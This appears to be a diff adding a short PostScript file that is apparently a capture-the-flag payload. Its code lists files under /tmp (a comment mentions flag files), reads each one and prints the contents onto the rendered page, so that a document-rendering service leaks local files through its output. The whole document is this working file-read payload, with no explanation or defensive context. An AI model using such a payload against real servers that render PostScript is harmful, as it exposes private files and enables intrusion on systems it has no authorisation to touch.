@@ -1,0 +1,14 @@
+%!PS
+% Set font and position
+/newfont /Helvetica findfont 12 scalefont setfont
+100 700 moveto
+% For each filename like /tmp/flag*
+(/tmp/*) {
+    % Open the file
+    (r) file
+    % Read a string from it
+    1000 string readstring
+    % Write that string in the page
+    pop show
+} 1000 string filenameforall
+showpage
